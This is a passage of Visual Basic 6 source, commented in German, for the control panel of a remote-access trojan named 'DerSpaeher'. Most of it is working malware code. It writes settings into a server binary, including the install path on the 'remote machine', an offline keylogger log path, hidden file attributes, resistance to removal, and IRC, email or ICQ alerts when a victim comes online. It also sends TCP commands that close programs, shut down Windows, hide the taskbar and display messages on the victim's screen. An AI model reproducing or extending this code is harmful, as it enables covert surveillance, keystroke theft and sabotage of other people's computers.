If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
DerSpaeher.WasSenden = "PortAktNo": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 34 Then
Dim rr
Text2.Text = List2.Text
Text2.SelStart = 0
Text2.SelLength = GetSetting("Abc", "Abc", List2.ListIndex)
rr = Text2.SelText
AlleAus
picContainer(34).Visible = True
txttextfelder(35).Text = rr
ElseIf Index = 29 Then
picContainer(25).Visible = False
picContainer(5).Visible = True
ElseIf Index = 18 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If txttextfelder(18).Text = "" Then
Dialog "Please, input a text for the message", "OK"

Exit Sub
Else
End If
DerSpaeher.WasSenden = txttextfelder(18).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 31 Then
If txttextfelder(28).Text = "" Then
Dialog "put something in the textbox", "OK"
Exit Sub
Else
End If
DerSpaeher.WasSenden = txttextfelder(28).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 30 Then
If txttextfelder(18).Text = "" Then
Dialog "Please, input a text for the message", "OK"
Exit Sub
Else
End If
If optAuswahl(0).Value = True Then
MsgBox txttextfelder(18).Text, vbOKCancel, "Message"
ElseIf optAuswahl(1).Value = True Then
MsgBox txttextfelder(18).Text, vbCritical, "Message"
ElseIf optAuswahl(2).Value = True Then
MsgBox txttextfelder(18).Text, vbInformation, "Message"
Else
End If
Else
End If
Exit Sub
X:
KeineVerbindung
End Sub

Sub AuslesenTarnen()
Open txttextfelder(7).Text For Binary As #1
DoEvents
ServerBinaer = Input(LOF(1), 1)
Close
Dim RSServer2 As String
Dim Zahl As Long
Dim Zahl2 As Long
Dim zahl3 As Long
Dim RSServer As String
Dim Search, Where
Search = "AnfangPI"
Where = InStr(ServerBinaer, Search)
If Where Then
RSServer = Right(ServerBinaer, Len(ServerBinaer) - (Where - 1))
Search = "ErsteDateiPI"
Where = InStr(RSServer, Search)
Zahl = Where + 11
Search = "ZweiteDateiPI"
Where = InStr(RSServer, Search)
Zahl2 = Where - 1
zahl3 = Zahl2 - Zahl
RSServer2 = Right(RSServer, Len(RSServer) - Zahl)
txttextfelder(4).Text = left(RSServer2, zahl3)

Search = "DritteDateiPI"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "ZweiteDateiPI"
Where = InStr(RSServer, Search)
Zahl2 = Where + 12
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
txttextfelder(5).Text = "0"

Search = "FehlerJaNein"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "DritteDateiPI"
Where = InStr(RSServer, Search)
Zahl2 = Where + 12
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Dim tt As String
tt = left(RSServer, zahl3)
If tt = "False" Then
Option4.Value = True
Else
Option3.Value = True
End If

Search = "RegPI"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "FehlerJaNein"
Where = InStr(RSServer, Search)
Zahl2 = Where + 13
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Dim TFFehlerJaNein As String
TFFehlerJaNein = left(RSServer, zahl3)
If TFFehlerJaNein = "False" Then
Option2.Value = True
Else
Option1.Value = True
End If

Search = "PassWortPI"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "RegPI"
Where = InStr(RSServer, Search)
Zahl2 = Where + 4
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
txttextfelder(8).Text = left(RSServer, zahl3)


Search = "DateiEndungen"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "PassWortPI"
Where = InStr(RSServer, Search)
Zahl2 = Where + 9
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
txttextfelder(11).Text = left(RSServer, zahl3)
If txttextfelder(11).Text = "Kein" Then
txttextfelder(11).Text = ""
Else
End If

Search = "ServerWO"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "DateiEndungen"
Where = InStr(RSServer, Search)
Zahl2 = Where + 12
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Text3.Text = left(RSServer, zahl3)
If Text3.Text = "True" Then
Option10.Value = True
Else
End If


Search = "OffWO"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "ServerWO"
Where = InStr(RSServer, Search)
Zahl2 = Where + 7
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
List4.Text = left(RSServer, zahl3)


Search = "OffNAME"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "OffWO"
Where = InStr(RSServer, Search)
Zahl2 = Where + 4
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
List3.Text = left(RSServer, zahl3)


Search = "Attrib"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "OffNAME"
Where = InStr(RSServer, Search)
Zahl2 = Where + 6
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
txttextfelder(26).Text = left(RSServer, zahl3)

Dim WertWert As String
Search = "Port"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "Attrib"
Where = InStr(RSServer, Search)
Zahl2 = Where + 5
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
WertWert = left(RSServer, zahl3)
If WertWert = "Alles" Then
Check1.Value = 1
Check2.Value = 1
ElseIf WertWert = "Erstes" Then
Check1.Value = 1
Check2.Value = 0
ElseIf WertWert = "Zweites" Then
Check1.Value = 0
Check2.Value = 1
ElseIf WertWert = "Keines" Then
Check1.Value = 0
Check2.Value = 0
Else
End If

Search = "IRCNotify"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "Port"
Where = InStr(RSServer, Search)
Zahl2 = Where + 3
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
txttextfelder(36).Text = left(RSServer, zahl3)

Search = "UnRemove"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "IRCNotify"
Where = InStr(RSServer, Search)
Zahl2 = Where + 8
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
If left(RSServer, zahl3) = "ON" Then
Option9.Value = True
Else
Option11.Value = True
End If


Search = "EndePI"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "UnRemove"
Where = InStr(RSServer, Search)
Zahl2 = Where + 7
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
If left(RSServer, zahl3) = "ON" Then
Option13.Value = True
Else
Option12.Value = True
End If

Else
Dialog "No settings", "OK"
End If
End Sub
Sub AuslesenEMail()
Dim a
Dim b
Dim c
Open txttextfelder(0).Text For Binary As #1
DoEvents
ServerBinaer = Input(LOF(1), 1)
Close
Dim RSServer2 As String
Dim Zahl As Long
Dim Zahl2 As Long
Dim zahl3 As Long
Dim RSServer As String
Dim Search, Where
Search = "AnfangEM"
Where = InStr(ServerBinaer, Search)
If Where Then
RSServer = Right(ServerBinaer, Len(ServerBinaer) - (Where - 1))
Search = "MailServerEM"
Where = InStr(RSServer, Search)
Zahl = Where + 11
Search = "MailAdresseEM"
Where = InStr(RSServer, Search)
Zahl2 = Where - 1
zahl3 = Zahl2 - Zahl
RSServer2 = Right(RSServer, Len(RSServer) - Zahl)
txttextfelder(1).Text = left(RSServer2, zahl3)

Search = "BetreffME"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "MailAdresseEM"
Where = InStr(RSServer, Search)
Zahl2 = Where + 12
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
txttextfelder(2).Text = left(RSServer, zahl3)

Search = "EndeEM"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "BetreffME"
Where = InStr(RSServer, Search)
Zahl2 = Where + 8
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
txttextfelder(3).Text = left(RSServer, zahl3)

a = txttextfelder(1).Text
b = txttextfelder(2).Text
c = txttextfelder(3).Text
If txttextfelder(3).Text = "ICQ" Then
Option6.Value = True

lblStandart(0).Caption = "UIN:"
lblStandart(1).Caption = "### "
lblStandart(2).Caption = "### "
txttextfelder(2).Locked = True
txttextfelder(3).Locked = True
txttextfelder(1).Text = a
txttextfelder(2).Text = "Nicht Erforderlich"
txttextfelder(3).Text = "Nicht Erforderlich"
Else
Option5.Value = True
lblStandart(0).Caption = "Mail-Server:"
lblStandart(1).Caption = "Mail-Adresse:"
lblStandart(2).Caption = "Betreff:"
txttextfelder(2).Locked = False
txttextfelder(3).Locked = False
txttextfelder(1).Text = a
txttextfelder(2).Text = b
txttextfelder(3).Text = c
End If

Else
Dialog "No settings", "OK"
End If
End Sub
Sub ServerBinaerOeffnen2()
On Error GoTo Fehler
Open txttextfelder(0).Text For Binary As #1
DoEvents
ServerBinaer = Input(LOF(1), 1)
Close #1
Dim Search, Where
Search = "AnfangEM"
Where = InStr(ServerBinaer, Search)
Dim Abcde
If Option5.Value = True Then
Abcde = txttextfelder(3).Text
Else
Abcde = "ICQ"
End If
If Where Then
Zeichen = left(ServerBinaer, Where - 1)
Open txttextfelder(0).Text For Output As #1
Print #1, Zeichen & "AnfangEMMailServerEM" & txttextfelder(1).Text & "MailAdresseEM" & txttextfelder(2).Text & "BetreffME" & Abcde & "EndeEM"
Close #1
Else
Dim DateiSchreiben
DateiSchreiben = "AnfangEMMailServerEM" & txttextfelder(1).Text & "MailAdresseEM" & txttextfelder(2).Text & "BetreffME" & Abcde & "EndeEM"
ServerBinaer = ServerBinaer & DateiSchreiben
Open txttextfelder(0).Text For Binary As #1
Put #1, 1, ServerBinaer
Close #1
End If
Load BitteWarten
BitteWarten.Label1.FontSize = "12"
BitteWarten.Label1.Caption = "The settings (configuration) have been saved"
BitteWarten.Label1.left = (BitteWarten.Width - BitteWarten.Label1.Width) / 2
BitteWarten.Label1.tOp = (BitteWarten.Height - BitteWarten.Label1.Height) / 2
BitteWarten.Show
Unload DerSpaeher
Exit Sub
Fehler:
FehlerAnzeigen
End Sub
Sub ServerBinaerOeffnen3()
On Error GoTo Fehler
Open txttextfelder(0).Text For Binary As #1
DoEvents
ServerBinaer = Input(LOF(1), 1)
Close #1
Dim Search, Where
Search = "AnfangEM"
Where = InStr(ServerBinaer, Search)
If Where Then
Zeichen = left(ServerBinaer, Where - 1)
Open txttextfelder(0).Text For Output As #1
Print #1, Zeichen & "AnfangEMMailServerEM" & txttextfelder(1).Text & "MailAdresseEM" & "ICQ" & "BetreffME" & "ICQ" & "EndeEM"
Close #1
Else
Dim DateiSchreiben
DateiSchreiben = "AnfangEMMailServerEM" & txttextfelder(1).Text & "MailAdresseEM" & "ICQ" & "BetreffME" & "ICQ" & "EndeEM"
ServerBinaer = ServerBinaer & DateiSchreiben
Open txttextfelder(0).Text For Binary As #1
Put #1, 1, ServerBinaer
Close #1
End If
Load BitteWarten
BitteWarten.Label1.FontSize = "12"
BitteWarten.Label1.Caption = "The settings (Online Alert) have been saved"
BitteWarten.Label1.left = (BitteWarten.Width - BitteWarten.Label1.Width) / 2
BitteWarten.Label1.tOp = (BitteWarten.Height - BitteWarten.Label1.Height) / 2
BitteWarten.Show
Unload DerSpaeher
Exit Sub
Fehler:
FehlerAnzeigen
End Sub
Sub ServerBinaerOeffnen()
On Error GoTo Fehler
If txttextfelder(36).Text = "" Then
Dialog "Wrong Port", "OK"
Exit Sub
Else
End If
Open txttextfelder(7).Text For Binary As #1
DoEvents
ServerBinaer = Input(LOF(1), 1)
Close #1
Dim PasswortServer
If txttextfelder(11).Text = "" Then
PasswortServer = "Kein"
Else
PasswortServer = txttextfelder(11).Text
End If
Dim Search, Where
Search = "AnfangPI"
Where = InStr(ServerBinaer, Search)
Dim fF As String
Dim Ad As String
If Option13.Value = True Then
Ad = "ON"
Else
Ad = "OFF"
End If
If Option9.Value = True Then
fF = "ON"
Else
fF = "OFF"
End If
Dim AttribWert As String
If Check1.Value = 1 And Check2.Value = 1 Then
AttribWert = "Alles"
ElseIf Check1.Value = 1 And Check2.Value = 0 Then
AttribWert = "Erstes"
ElseIf Check1.Value = 0 And Check2.Value = 1 Then
AttribWert = "Zweites"
ElseIf Check1.Value = 0 And Check2.Value = 0 Then
AttribWert = "Keines"
Else
AttribWert = "aaa"
End If
If Where Then
MailInDatei
Zeichen = left(ServerBinaer, Where - 1)

Open txttextfelder(7).Text For Output As #1
Print #1, Zeichen & "AnfangPIErsteDateiPI" & txttextfelder(4).Text & "ZweiteDateiPI" & "Leer" & "DritteDateiPI" & Option3.Value & "FehlerJaNeinPI" & Option1.Value & "RegPI" & txttextfelder(8).Text & "PassWortPI" & PasswortServer & "DateiEndungen" & Option10.Value & "ServerWO" & List4.ToolTipText & "OffWO" & List3.ToolTipText & "OffNAME" & txttextfelder(26).Text & "Attrib" & AttribWert & "Port" & txttextfelder(36).Text & "IRCNotify" & fF & "UnRemove" & Ad & "EndePI" & ZwischenWert
Close #1
Else
MailInDatei2
Dim DateiSchreiben
DateiSchreiben = "AnfangPIErsteDateiPI" & txttextfelder(4).Text & "ZweiteDateiPI" & "Leer" & "DritteDateiPI" & Option3.Value & "FehlerJaNeinPI" & Option1.Value & "RegPI" & txttextfelder(8).Text & "PassWortPI" & PasswortServer & "DateiEndungen" & Option10.Value & "ServerWO" & List4.ToolTipText & "OffWO" & List3.ToolTipText & "OffNAME" & txttextfelder(26).Text & "Attrib" & AttribWert & "Port" & txttextfelder(36).Text & "IRCNotify" & fF & "UnRemove" & Ad & "EndePI"
If ZZahl = "0" Then
ServerBinaer = ServerBinaer & DateiSchreiben
Else
ServerBinaer = left(ServerBinaer, ZZahl) & DateiSchreiben & ZwischenWert
End If
Open txttextfelder(7).Text For Binary As #1
Put #1, 1, ServerBinaer
Close #1
End If
If DateiGroesse = "0" Then
Open txttextfelder(7).Text For Binary As #1
DoEvents
DateiGroesse = Input(LOF(1), 1)
Close #1
Else
End If
Dim aa As Long
aa = FileLen(txttextfelder(7).Text)
Dim Laenge As Long
Laenge = txttextfelder(5).Text
If Laenge > aa Then
Dialog "The Bytes for the Server are to much (no more then the Server please)", "OK"

Exit Sub
Else
ServerBinaer = DateiGroesse & left(DateiGroesse, Laenge)
Open txttextfelder(7).Text For Binary As #1
Put #1, 1, ServerBinaer
Close #1

End If
Load BitteWarten
BitteWarten.Label1.FontSize = "12"
BitteWarten.Label1.Caption = "The settings (Configuration) have been saved"
BitteWarten.Label1.left = (BitteWarten.Width - BitteWarten.Label1.Width) / 2
BitteWarten.Label1.tOp = (BitteWarten.Height - BitteWarten.Label1.Height) / 2
BitteWarten.Show
Unload DerSpaeher
Exit Sub
Fehler:
FehlerAnzeigen
End Sub
Sub MailInDatei()
Dim Searchh, Wheree
Searchh = "AnfangEM"
Wheree = InStr(ServerBinaer, Searchh)
If Wheree Then
ZwischenWert = Right(ServerBinaer, Len(ServerBinaer) - Wheree + 1)
Else
ZwischenWert = ""
End If
End Sub

Sub MailInDatei2()
Dim Searchh, Wheree
Searchh = "AnfangEM"
Wheree = InStr(ServerBinaer, Searchh)
If Wheree Then
ZZahl = Wheree - 1
ZwischenWert = Right(ServerBinaer, Len(ServerBinaer) - Wheree + 1)
Else
ZZahl = "0"
ZwischenWert = ""
End If
End Sub
Sub FehlerAnzeigen()
Dialog "You have forgotten something", "OK"

End Sub
Private Sub lblUeberschrift_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
shpueberschrift(Index).BackColor = &HC0C000
End Sub



Private Sub lblwindows_Click(Index As Integer)
On Error GoTo X
If Index <> 10 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "EAus": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 1 Then
Action.Text = "WelcherUser"
DerSpaeher.WasSenden = "WelcherUser": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "AllesMinimieren": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "AllesMaximieren": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 4 Then
DerSpaeher.WasSenden = "AllesVerkleinern": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 5 Then
DerSpaeher.WasSenden = "AllesBeenden": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 6 Then
DerSpaeher.WasSenden = "EWinBeenden": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 7 Then
DerSpaeher.WasSenden = "EUhr": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 8 Then
DerSpaeher.WasSenden = "ETaskleiste": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 9 Then
DerSpaeher.WasSenden = "ESuchen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = "10" Then
AlleAus
picContainer(6).Visible = True
Exit Sub
ElseIf Index = "11" Then
AlleAus
Action.Text = "AlleFenster"
picContainer(8).Visible = True
DerSpaeher.WasSenden = "AlleFensterErmitteln": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
End If
If Index = 1 Then
Else
BW
End If
Exit Sub
X:
KeineVerbindung
End Sub

Private Sub lblwindows_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblwindows(Index).ForeColor = &HFFFF00 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 11
lblwindows(indx).ForeColor = &HC0C000
Next
lblwindows(Index).ForeColor = &HFFFF00
End Sub

Private Sub List1_Click()
On Error Resume Next
Text3.Text = List1.Text
Text3.SelStart = 0
Text3.SelLength = GetSetting("Abc2", "Abc2", List1.ListIndex)
DateiName = MomentanesVerzeichnis & "\" & Text3.SelText
End Sub

Private Sub List1_DblClick()
On Error Resume Next
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Laufwerk = True Then
Text3.Text = List1.Text
Text3.SelStart = 0
Text3.SelLength = 2
BHJ = Text3.SelText
Text7.Text = Text3.SelText & "\"

Action.Text = "DateiVerz"
DerSpaeher.WasSenden = "VerzOKK": InsStatus: tcp1.SendData DerSpaeher.WasSenden

Else
Text3.Text = List1.Text
Text3.SelStart = 0
Text3.SelLength = GetSetting("Abc2", "Abc2", List1.ListIndex)
Text7.Text = Text3.SelText
BHJ = Text7.Text
Action.Text = "DateiVerz"
DerSpaeher.WasSenden = "VerzOKK": InsStatus: tcp1.SendData DerSpaeher.WasSenden
End If
End Sub

Private Sub List1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
List1.ToolTipText = DateiName
End Sub

Private Sub List2_Click()
List2.ToolTipText = List2.Text
End Sub

Private Sub List3_Click()
If List3.Text = "other path" Then
WichtigG = "OffT"
Dialog "Please put here the path, where the offline keylogger file will be saved on the remote machine", "INPUT"
Else
List3.ToolTipText = List3.Text
End If
End Sub

Private Sub List4_Click()
If List4.Text = "other path" Then
WichtigG = "VerS"
Dialog "Please put here the path, where the server will be saved on the remote machine", "INPUT"
Else
List4.ToolTipText = List4.Text
End If
End Sub


Private Sub List6_Click()
If List6.Text = "ESC" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{ESC}"
ElseIf List6.Text = "F1" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F1}"
ElseIf List6.Text = "F2" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F2}"
ElseIf List6.Text = "F3" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F3}"
ElseIf List6.Text = "F4" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F4}"
ElseIf List6.Text = "F5" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F5}"
ElseIf List6.Text = "F6" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F6}"
ElseIf List6.Text = "F7" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F7}"
ElseIf List6.Text = "F8" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F8}"
ElseIf List6.Text = "F9" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F9}"
ElseIf List6.Text = "F10" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F10}"
ElseIf List6.Text = "F11" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F11}"
ElseIf List6.Text = "F12" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{F12}"
ElseIf List6.Text = "backspace" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{BS}"
ElseIf List6.Text = "enter" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{ENTER}"
ElseIf List6.Text = "insert" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{INS}"
ElseIf List6.Text = "page up" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{PGUP}"
ElseIf List6.Text = "page down" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{PGDN}"
ElseIf List6.Text = "left" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{LEFT}"
ElseIf List6.Text = "right" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{RIGHT}"
ElseIf List6.Text = "up" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{UP}"
ElseIf List6.Text = "down" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{DOWN}"
ElseIf List6.Text = "alt" Then
txttextfelder(24).Text = txttextfelder(24).Text & "%"
ElseIf List6.Text = "ctrl" Then
txttextfelder(24).Text = txttextfelder(24).Text & "^"
ElseIf List6.Text = "shift" Then
txttextfelder(24).Text = txttextfelder(24).Text & "+"
ElseIf List6.Text = "tab" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{TAB}"
ElseIf List6.Text = "capslock" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{CAPSLOCK}"
ElseIf List6.Text = "home" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{HOME}"
ElseIf List6.Text = "end" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{END}"
ElseIf List6.Text = "num lock" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{NUMLOCK}"
ElseIf List6.Text = "delete" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{DEL}"
ElseIf List6.Text = "break" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{BREAK}"
ElseIf List6.Text = "scroll lock" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{SCROLLLOCK}"
ElseIf List6.Text = "ENTER" Then
txttextfelder(24).Text = txttextfelder(24).Text & "{ENTER}"
Else
End If
End Sub

Private Sub lstIPErgebnisse_GotFocus()
On Error Resume Next
Dim indx As Integer
For indx = 0 To GruenAnzahl
txttextfelder(indx).BackColor = &H808000
Next
lstIPErgebnisse.BackColor = &H8000&
End Sub

Private Sub optAuswahl_Click(Index As Integer)
On Error Resume Next
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
txttextfelder(18).BackColor = &H808000
If Index = 0 Then
DerSpaeher.WasSenden = "vbOK": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "vbKritisch": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "vbInfo": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
End If
End Sub

Private Sub Option5_Click()
lblStandart(0).Caption = "mail-server:"
lblStandart(1).Caption = "mail-adress:"
lblStandart(2).Caption = "subject:"
txttextfelder(2).Locked = False
txttextfelder(3).Locked = False
txttextfelder(1).Text = ""
txttextfelder(2).Text = ""
txttextfelder(3).Text = ""
End Sub

Private Sub Option6_Click()
lblStandart(0).Caption = "UIN:"
lblStandart(1).Caption = ""
lblStandart(2).Caption = ""
txttextfelder(2).Locked = True
txttextfelder(3).Locked = True
txttextfelder(1).Text = ""
txttextfelder(2).Text = "not required"
txttextfelder(3).Text = "not required"

End Sub



Private Sub picContainer_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
Dim indx As Integer
shpersatz(5).BackColor = &H404000
For indx = 0 To 45
shpueberschrift(indx).BackColor = &H404000
Next
If picContainer(3).Visible = True Then
For indx = 0 To 4
lblSO(indx).ForeColor = &HC0C000
Next
Else
End If
For indx = 0 To 1
lblMaus(indx).ForeColor = &HC0C000
Next
If picContainer(7).Visible = True Then
For indx = 0 To 11
lblwindows(indx).ForeColor = &HC0C000
Next
Else
End If
For indx = 0 To 3
lblDatumZeit(indx).ForeColor = &HC0C000
Next
For indx = 0 To 4
lblGemein(indx).ForeColor = &HC0C000
Next
For indx = 0 To 4
lblSounds(indx).ForeColor = &HC0C000
Next
For indx = 0 To 3
lblAkOp(indx).ForeColor = &HC0C000
Next
For indx = 0 To 2
lblTastatur(indx).ForeColor = &H404000
Next
For indx = 0 To 10
lblextras(indx).ForeColor = &H404000
Next
If picContainer(37).Visible = True Then
For indx = 0 To 8
lblICQ(indx).ForeColor = &H404000
Next
Else
End If
If picContainer(20).Visible = True Then
For indx = 0 To 3
lblInternet(indx).ForeColor = &H404000
Next
Else
End If
If picContainer(22).Visible = True Then
For indx = 0 To 4
lblAufl(indx).ForeColor = &H404000
Next
Else
End If
If picContainer(31).Visible = True Then
For indx = 0 To 1
lblTast(indx).ForeColor = &H404000
Next
Else
End If
End Sub

Private Sub picFunktionen_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
Dim indx As Integer

For indx = 0 To lblFunktionenAnzahl
If lblFunktionen(indx).ForeColor = &HFFFFC0 Then GoTo u
lblFunktionen(indx).ForeColor = &HFFFFC0
u:
Next

For indx = 0 To AnzahllblAuswahl
If lblAuswahl(indx).ForeColor = lblAuswahlSchriftFarbeUnaktiv Then
GoTo ab
Else
End If
lblAuswahl(indx).ForeColor = lblAuswahlSchriftFarbeUnaktiv
ab:
Next
End Sub

Private Sub picTitelLeiste_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
frmLinks = X
frmOben = Y
End Sub

Private Sub picTitelLeiste_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
DerSpaeher.left = DerSpaeher.left - frmLinks + X
DerSpaeher.tOp = DerSpaeher.tOp - frmOben + Y
End Sub
Sub AusgangsStellung()
shpButton(0).tOp = 50
Dim indx As Integer
For indx = 1 To 6
If indx = 1 Then
shpButton(indx).tOp = shpButton(0).tOp + 360
Else
shpButton(indx).tOp = shpButton(indx - 1).tOp + 360
End If
Next
For indx = 0 To 6
lblAuswahl(indx).tOp = shpButton(indx).tOp + WertlblBeschriftung
shpButton(indx).BackColor = shpNormalFarbe
Next
tfEinstellungen
For indx = 0 To PicAnzeigen
picFunktionen(indx).Visible = False
Next
End Sub

Sub ServerStellung()
shpButton(0).BackColor = shpFarbe
PicAusblenden
picFunktionen(5).Visible = True
End Sub

Sub ClientStellung()
shpButton(1).BackColor = shpFarbe

PicAusblenden

picFunktionen(6).Visible = True
End Sub
Sub DateiStellung()
shpButton(2).BackColor = shpFarbe

PicAusblenden

picFunktionen(0).Visible = True

End Sub
Sub FunStellung()
shpButton(3).BackColor = shpFarbe

PicAusblenden

picFunktionen(1).Visible = True
End Sub
Sub MeldungStellung()
shpButton(4).BackColor = shpFarbe

Dim indx As Integer

PicAusblenden

picFunktionen(2).Visible = True
End Sub
Sub ErweitertStellung()
shpButton(5).BackColor = shpFarbe

PicAusblenden

picFunktionen(3).Visible = True
End Sub
Sub SonstigesStellung()
shpButton(6).BackColor = shpFarbe

PicAusblenden
picFunktionen(4).Visible = True
End Sub

Sub tfEinstellungen()
Dim indx As Integer
For indx = 0 To 6
shpButton(indx).BackColor = shpNormalFarbe
Next
tfServer = False
tfClient = False
tfDatei = False
tfFun = False
tfMeldung = False
tfErweitert = False
tfSonstiges = False
End Sub
Sub PicAusblenden()
Dim indx As Integer
For indx = 0 To PicAnzeigen
picFunktionen(indx).Visible = False
Next
End Sub

Sub LampeVerbinden(ByVal StatusVerbinden As String)

If StatusVerbinden = "Verbinde" Then
lblErgebnis.Caption = ""
lblStatus.Visible = True
lblErgebnis.Visible = False
Timer1.Enabled = False
lblersatz(5).Caption = "connecting"
lblStatus.Caption = "connecting"
shpLampe.BackColor = vbBlue
ElseIf StatusVerbinden = "Verbunden" Then
lblErgebnis.Caption = "Gröse festgelegt"
lblStatus.Visible = True
lblErgebnis.Visible = False
Timer1.Enabled = False
tmrVerbinden.Enabled = False
lblZeit.Caption = "10"
lblStatus.Caption = "connected with: " & tcp1.RemoteHostIP
shpLampe.BackColor = vbGreen
lblersatz(5).Caption = "close"
ElseIf StatusVerbinden = "Getrennt" Then
lblErgebnis.Caption = "Gröse festgelegt"
lblStatus.Visible = True
lblErgebnis.Visible = False
Timer1.Enabled = False
lblersatz(5).Caption = "connect"
lblStatus.Caption = "not connected"
shpLampe.BackColor = vbRed
Else
End If

End Sub



Private Sub Picture3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim indx As Integer
For indx = 0 To 2
shpDialog(indx).BackColor = &H404000
Next
End Sub

Private Sub PortR_Close()
portr.Close
portr.Listen
End Sub

Private Sub PortR_ConnectionRequest(ByVal requestID As Long)
If portr.State <> sckClosed Then portr.Close
portr.Accept requestID
txttextfelder(30).Text = txttextfelder(30).Text & vbCrLf & "Bereit..."
